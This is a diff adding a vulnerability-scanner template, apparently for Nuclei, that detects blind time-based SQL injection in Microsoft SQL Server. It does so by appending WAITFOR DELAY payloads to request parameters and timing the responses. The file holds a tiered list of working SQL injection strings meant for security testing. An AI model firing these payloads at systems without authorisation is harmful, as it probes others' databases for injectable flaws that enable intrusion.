@@ -1,0 +1,49 @@
+id: mssql-blind-time-based-sqli
+
+info:
+  name: MSSQL SQLi - Blind Time based
+  author: pdteam
+  severity: critical
+  reference:
+    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionMsSqlScanRule.java
+
+http:
+  - payloads:
+      injections:
+        low:
+          - " WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - "' WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - "\" WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+        medium:
+          - ") WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - ") ' WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - ") \" WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - ")) WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - ")) ' WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+          - ")) \" WAITFOR DELAY '0:0:[SLEEPTIME]' --"
+        high:
+          - ") WAITFOR DELAY '0:0:[SLEEPTIME]' ("
+          - ") ' WAITFOR DELAY '0:0:[SLEEPTIME]' ("
+          - ") \" WAITFOR DELAY '0:0:[SLEEPTIME]' ("
+          - ")) WAITFOR DELAY '0:0:[SLEEPTIME]' (("
+          - ")) ' WAITFOR DELAY '0:0:[SLEEPTIME]' (("
+          - ")) \" WAITFOR DELAY '0:0:[SLEEPTIME]' (("
+          
+    attack: pitchfork
+    analyzer:
+      name: time_delay
+        
+    fuzzing:
+      - part: request
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injections}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: analyzer
+        words:
+          - "true" 
